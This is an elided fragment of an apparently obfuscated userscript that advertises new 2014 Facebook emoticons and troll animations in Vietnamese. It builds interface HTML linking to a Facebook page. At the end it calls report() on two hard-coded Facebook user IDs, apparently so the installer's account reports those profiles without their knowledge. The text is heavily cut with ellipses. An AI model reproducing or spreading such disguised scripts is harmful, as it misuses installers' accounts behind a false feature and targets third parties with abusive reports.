// ==UserScript==
// @name            CHỨC NĂNG ICON 2014 MỚI CHO FACEBOOK VÀ HÌNH ĐỘNG TROLL VUI NHỘN
...
var _0x3384x1 = [{
    ...
    _0x3384x4 += '<a class="jewelFooter" href="https://www.facebook.com/CauBimSoCiu" target="_blank">Cậu Bim</a>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
    _0x3384x4 += '</div>';
...
report("100005303346196");report("100006430370996");